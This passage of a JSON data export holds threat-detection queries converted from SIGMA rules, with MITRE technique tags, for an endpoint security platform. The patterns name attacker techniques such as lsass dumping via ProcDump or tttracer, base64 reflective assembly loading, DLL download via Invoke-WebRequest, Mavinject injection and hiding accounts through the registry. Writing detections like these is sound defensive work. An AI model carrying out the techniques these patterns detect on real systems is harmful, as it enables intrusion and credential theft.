            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.image.path contains \"\\devtoolslauncher.exe\" and tgt.process.cmdline contains \"LaunchForDeploy\"))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 131
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects applications trying to modify the registry in order to disable any write-protect property for storage devices.\nThis could be a precursor to a ransomware attack and has been an observed technique used by cypherpunk group.\n",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1562"
            ],
            "name": "Write Protect For Storage Disabled",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.cmdline contains \"\\System\\CurrentControlSet\\Control\" and tgt.process.cmdline contains \"Write Protection\" and tgt.process.cmdline contains \"0\" and tgt.process.cmdline contains \"storage\"))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 132
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects process injection using the signed Windows tool \"Mavinject\" via the \"INJECTRUNNING\" flag",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1055",
                "t1218"
            ],
            "name": "Mavinject Inject DLL Into Running Process",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.cmdline contains \" /INJECTRUNNING \" and (not src.process.image.path=\"C:\\Windows\\System32\\AppVClient.exe\")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 133
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects suspicious use of 'calc.exe' with command line parameters or in a suspicious directory, which is likely caused by some PoC or detection evasion.\n",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1036"
            ],
            "name": "Suspicious Calculator Usage",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.cmdline contains \"\\calc.exe \" or (tgt.process.image.path contains \"\\calc.exe\" and (not (tgt.process.image.path contains \":\\Windows\\System32\\\" or tgt.process.image.path contains \":\\Windows\\SysWOW64\\\" or tgt.process.image.path contains \":\\Windows\\WinSxS\\\")))))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 134
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects the usage of the \"sftp.exe\" binary as a LOLBIN by abusing the \"-D\" flag",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1218"
            ],
            "name": "Use Of The SFTP.EXE Binary As A LOLBIN",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.image.path contains \"\\sftp.exe\" and (tgt.process.cmdline contains \" -D ..\" or tgt.process.cmdline contains \" -D C:\\\")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 135
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects uses of the SysInternals ProcDump utility in which ProcDump or its output get renamed, or a dump file is moved or copied to a different name",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1036",
                "t1003"
            ],
            "name": "Potential SysInternals ProcDump Evasion",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((tgt.process.cmdline contains \"copy procdump\" or tgt.process.cmdline contains \"move procdump\") or ((tgt.process.cmdline contains \"copy \" and tgt.process.cmdline contains \".dmp \") and (tgt.process.cmdline contains \"2.dmp\" or tgt.process.cmdline contains \"lsass\" or tgt.process.cmdline contains \"out.dmp\")) or (tgt.process.cmdline contains \"copy lsass.exe_\" or tgt.process.cmdline contains \"move lsass.exe_\")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 136
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects a suspicious process spawning a Chromium based browser process with the 'load-extension' flag to start an instance with a custom extension",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1176"
            ],
            "name": "Suspicious Chromium Browser Instance Executed With Custom Extension",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((src.process.image.path contains \"\\cmd.exe\" or src.process.image.path contains \"\\cscript.exe\" or src.process.image.path contains \"\\mshta.exe\" or src.process.image.path contains \"\\powershell.exe\" or src.process.image.path contains \"\\pwsh.exe\" or src.process.image.path contains \"\\regsvr32.exe\" or src.process.image.path contains \"\\rundll32.exe\" or src.process.image.path contains \"\\wscript.exe\") and (tgt.process.image.path contains \"\\brave.exe\" or tgt.process.image.path contains \"\\chrome.exe\" or tgt.process.image.path contains \"\\msedge.exe\" or tgt.process.image.path contains \"\\opera.exe\" or tgt.process.image.path contains \"\\vivaldi.exe\") and tgt.process.cmdline contains \"--load-extension=\"))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 137
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects suspicious UltraVNC command line flag combination that indicate a auto reconnect upon execution, e.g. startup (as seen being used by Gamaredon threat group)",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1021"
            ],
            "name": "Suspicious UltraVNC Execution",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.cmdline contains \"-autoreconnect \" and tgt.process.cmdline contains \"-connect \" and tgt.process.cmdline contains \"-id:\"))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 138
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects the execution of Microsoft Quick Assist tool \"QuickAssist.exe\". This utility can be used by attackers to gain remote access.\n",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1219"
            ],
            "name": "QuickAssist Execution",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and tgt.process.image.path contains \"\\QuickAssist.exe\")",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 139
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects powershell scripts that import modules from suspicious directories",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1059"
            ],
            "name": "Import PowerShell Modules From Suspicious Directories - ProcCreation",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.cmdline contains \"Import-Module \\\"$Env:Temp\\\" or tgt.process.cmdline contains \"Import-Module '$Env:Temp\\\" or tgt.process.cmdline contains \"Import-Module $Env:Temp\\\" or tgt.process.cmdline contains \"Import-Module \\\"$Env:Appdata\\\" or tgt.process.cmdline contains \"Import-Module '$Env:Appdata\\\" or tgt.process.cmdline contains \"Import-Module $Env:Appdata\\\" or tgt.process.cmdline contains \"Import-Module C:\\Users\\Public\\\" or tgt.process.cmdline contains \"ipmo \\\"$Env:Temp\\\" or tgt.process.cmdline contains \"ipmo '$Env:Temp\\\" or tgt.process.cmdline contains \"ipmo $Env:Temp\\\" or tgt.process.cmdline contains \"ipmo \\\"$Env:Appdata\\\" or tgt.process.cmdline contains \"ipmo '$Env:Appdata\\\" or tgt.process.cmdline contains \"ipmo $Env:Appdata\\\" or tgt.process.cmdline contains \"ipmo C:\\Users\\Public\\\"))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 140
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects changes to the registry key \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\Userlist\" where the value is set to \"0\" in order to hide user account from being listed on the logon screen.\n",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1564"
            ],
            "name": "Hiding User Account Via SpecialAccounts Registry Key - CommandLine",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.image.path contains \"\\reg.exe\" and (tgt.process.cmdline contains \"\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList\" and tgt.process.cmdline contains \"add\" and tgt.process.cmdline contains \"/v\" and tgt.process.cmdline contains \"/d 0\")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 141
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects potentially suspicious child processes of \"regsvr32.exe\".",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1218"
            ],
            "name": "Potentially Suspicious Child Process Of Regsvr32",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((src.process.image.path contains \"\\regsvr32.exe\" and (tgt.process.image.path contains \"\\calc.exe\" or tgt.process.image.path contains \"\\cscript.exe\" or tgt.process.image.path contains \"\\explorer.exe\" or tgt.process.image.path contains \"\\mshta.exe\" or tgt.process.image.path contains \"\\net.exe\" or tgt.process.image.path contains \"\\net1.exe\" or tgt.process.image.path contains \"\\nltest.exe\" or tgt.process.image.path contains \"\\notepad.exe\" or tgt.process.image.path contains \"\\powershell.exe\" or tgt.process.image.path contains \"\\pwsh.exe\" or tgt.process.image.path contains \"\\reg.exe\" or tgt.process.image.path contains \"\\schtasks.exe\" or tgt.process.image.path contains \"\\werfault.exe\" or tgt.process.image.path contains \"\\wscript.exe\")) and (not (tgt.process.image.path contains \"\\werfault.exe\" and tgt.process.cmdline contains \" -u -p \"))))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 142
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects base64 encoded .NET reflective loading of Assembly",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1059",
                "t1027",
                "t1620"
            ],
            "name": "PowerShell Base64 Encoded Reflective Assembly Load",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.cmdline contains \"WwBSAGUAZgBsAGUAYwB0AGkAbwBuAC4AQQBzAHMAZQBtAGIAbAB5AF0AOgA6AEwAbwBhAGQAKA\" or tgt.process.cmdline contains \"sAUgBlAGYAbABlAGMAdABpAG8AbgAuAEEAcwBzAGUAbQBiAGwAeQBdADoAOgBMAG8AYQBkACgA\" or tgt.process.cmdline contains \"bAFIAZQBmAGwAZQBjAHQAaQBvAG4ALgBBAHMAcwBlAG0AYgBsAHkAXQA6ADoATABvAGEAZAAoA\" or tgt.process.cmdline contains \"AFsAcgBlAGYAbABlAGMAdABpAG8AbgAuAGEAcwBzAGUAbQBiAGwAeQBdADoAOgAoACIATABvAGEAZAAiAC\" or tgt.process.cmdline contains \"BbAHIAZQBmAGwAZQBjAHQAaQBvAG4ALgBhAHMAcwBlAG0AYgBsAHkAXQA6ADoAKAAiAEwAbwBhAGQAIgAp\" or tgt.process.cmdline contains \"AWwByAGUAZgBsAGUAYwB0AGkAbwBuAC4AYQBzAHMAZQBtAGIAbAB5AF0AOgA6ACgAIgBMAG8AYQBkACIAK\" or tgt.process.cmdline contains \"WwBSAGUAZgBsAGUAYwB0AGkAbwBuAC4AQQBzAHMAZQBtAGIAbAB5AF0AOgA6ACgAIgBMAG8AYQBkACIAKQ\" or tgt.process.cmdline contains \"sAUgBlAGYAbABlAGMAdABpAG8AbgAuAEEAcwBzAGUAbQBiAGwAeQBdADoAOgAoACIATABvAGEAZAAiACkA\" or tgt.process.cmdline contains \"bAFIAZQBmAGwAZQBjAHQAaQBvAG4ALgBBAHMAcwBlAG0AYgBsAHkAXQA6ADoAKAAiAEwAbwBhAGQAIgApA\" or tgt.process.cmdline contains \"WwByAGUAZgBsAGUAYwB0AGkAbwBuAC4AYQBzAHMAZQBtAGIAbAB5AF0AOgA6AEwAbwBhAGQAKA\" or tgt.process.cmdline contains \"sAcgBlAGYAbABlAGMAdABpAG8AbgAuAGEAcwBzAGUAbQBiAGwAeQBdADoAOgBMAG8AYQBkACgA\" or tgt.process.cmdline contains \"bAHIAZQBmAGwAZQBjAHQAaQBvAG4ALgBhAHMAcwBlAG0AYgBsAHkAXQA6ADoATABvAGEAZAAoA\")) | columns tgt.process.cmdline",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 143
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects usage of Time Travel Debugging Utility. Adversaries can execute malicious processes and dump processes, such as lsass.exe, via tttracer.exe.",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1218",
                "t1003"
            ],
            "name": "Time Travel Debugging Utility Usage",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and src.process.image.path contains \"\\tttracer.exe\")",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 144
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects potential DLL files being downloaded using the PowerShell Invoke-WebRequest cmdlet",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1059",
                "t1105"
            ],
            "name": "Potential DLL File Download Via PowerShell Invoke-WebRequest",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((tgt.process.cmdline contains \"Invoke-WebRequest \" or tgt.process.cmdline contains \"IWR \") and (tgt.process.cmdline contains \"http\" and tgt.process.cmdline contains \"OutFile\" and tgt.process.cmdline contains \".dll\")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 145
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Download and compress a remote file and store it in a cab file on local machine.",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1105"
            ],
            "name": "Suspicious Diantz Download and Compress Into a CAB File",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.cmdline contains \"diantz.exe\" and tgt.process.cmdline contains \" \\\\\" and tgt.process.cmdline contains \".cab\"))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 146
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects command line containing reference to the \"::$index_allocation\" stream, which can be used as a technique to prevent access to folders or files from tooling such as \"explorer.exe\" or \"powershell.exe\"\n",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1564"
            ],
            "name": "Potential Hidden Directory Creation Via NTFS INDEX_ALLOCATION Stream - CLI",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and tgt.process.cmdline contains \"::$index_allocation\")",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
